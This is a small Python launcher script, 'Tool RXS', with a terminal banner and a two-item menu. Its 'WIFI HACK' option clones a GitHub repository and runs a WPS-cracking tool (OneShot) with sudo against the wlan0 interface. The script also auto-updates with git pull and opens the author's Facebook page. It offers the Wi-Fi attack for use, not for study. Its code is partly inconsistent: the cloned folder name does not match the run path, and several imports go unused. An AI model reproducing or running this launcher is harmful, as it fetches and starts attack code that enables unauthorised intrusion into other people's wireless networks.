import os
os.system("clear")
from os import path
import os,base64,zlib,pip,urllib,time
print('[\033[1;32m✓\033[1;37m] Checking For Update ! ')
time.sleep(1.5)
print('[\033[1;32m✓\033[1;37m] Updating Tool RXS ! ')
time.sleep(1.5)
os.system('git pull')
os.system('clear')
print('[\033[1;32m✓\033[1;37m] Tool RXS Update Done \033[1;32m✓\033[1;37m Now You Can Enjoy Tool RXS(^,^) ')
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/reyadbross?mibextid=ZbWKwL ')
os.system(f" clear")

logo =                                          """            
	\033[1;32m██████╗ ██╗  ██╗███████╗\033[1;37m
	\033[1;32m██╔══██╗╚██╗██╔╝██╔════╝\033[1;37m
	\033[1;32m██████╔╝ ╚███╔╝ ███████╗\033[1;37m
	\033[1;32m██╔══██╗ ██╔██╗ ╚════██║\033[1;37m
	\033[1;32m██║  ██║██╔╝ ██╗███████║\033[1;37m
	\033[1;32m╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝\033[1;37m \033[1;36m2.0\033[1;37m
\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
\033[1;37m Owner   :            REYAD X SHIPU
\033[1;37m Facebook:            MD REYAD HOSSAIN SHANTO
\033[1;37m Github  :            BINOD-XD
\033[1;31m Note    :	      \033[1;31mROOT DEVICES ONLY
\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m """

print(logo)

print("[1] WIFI HACK")
print("[2] CONTACT US")

wifi =input('choice:')
if wifi in ['1']:
	os.system('git clone https://github.com/BINOD-XD/wifi-hack')
	os.system('sudo python OneShot/oneshot.py -i wlan0 --iface-down -K')
if wifi in ['2']:
	os.system("xdg-open https://www.facebook.com/reyadbross?mibextid=ZbWKwL")